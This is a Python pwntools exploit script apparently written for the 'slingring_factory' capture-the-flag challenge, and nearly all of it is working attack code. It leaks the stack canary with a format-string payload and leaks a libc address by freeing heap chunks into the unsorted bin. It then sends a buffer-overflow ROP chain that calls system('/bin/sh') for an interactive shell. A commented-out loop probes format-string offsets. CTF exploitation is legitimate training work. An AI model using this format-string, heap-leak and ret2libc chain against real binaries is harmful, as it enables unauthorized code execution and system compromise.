#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./slingring_factory_patched", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc challs.nusgreyhats.org 35678"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        if args.GDB:
            return gdb.debug(args=args_, env=env, gdbscript=gdbscript)
        return process(args_, env=env, *a, **kw)


env = {}
gdbscript = """
source ~/.gdbinit-gef-bata24.py
"""


def enter():
    io.sendafter(b"Press ENTER to return.", b"\n")


def forge(slot, dst: bytes, amount):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b"rings!\n", str(slot).encode())
    io.sendlineafter(b"location:\n", dst)
    io.sendlineafter(b"(1-9):\n", str(amount).encode())
    enter()


def discard(slot):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b"discard?\n", str(slot).encode())


def show(slot):
    io.sendlineafter(b">> ", b"1")
    io.recvuntil(b"[Destination]\n")
    data = io.recvlines(10)
    leak = u64(data[slot].split(b" | ")[-1].ljust(8, b"\x00"))
    enter()
    return leak


# for i in range(1, 64):
#     with context.quiet:
#         io = start()

#     payload = f"%{i}$p".encode()
#     io.sendlineafter(b"name?\n", payload)
#     io.recvuntil(b"Hello, ")
#     leak = io.recvline()
#     log.info(f"{i}: {leak}")

#     with context.quiet:
#         io.close()

canary_idx = 7

io = start()
payload = f"%{canary_idx}$p".encode()
io.sendlineafter(b"name?\n", payload)
io.recvuntil(b"Hello, ")
canary = int(io.recvline().strip(), 16)
log.info(f"{canary=:#x}")

for i in range(10):
    forge(i, b"a", 9)

for i in range(7):
    discard(i)

discard(7)
libc_leak = show(7)
libc.address = libc_leak - libc.sym["main_arena"] - 96
log.info(f"{libc.address=:#x}")

io.sendlineafter(b">> ", b"4")
io.sendlineafter(b"(id): ", b"1")

writable = libc.address + 0x21c000
pop_rdi = libc.address + 0x001bbea1
ret = pop_rdi + 1

payload = flat(
    b"A" * 0x38,
    canary,
    writable + 0x1000,
    pop_rdi, next(libc.search(b"/bin/sh\x00")),
    ret,
    libc.sym["system"]
)
io.sendlineafter(b"spell: ", payload)

io.interactive()
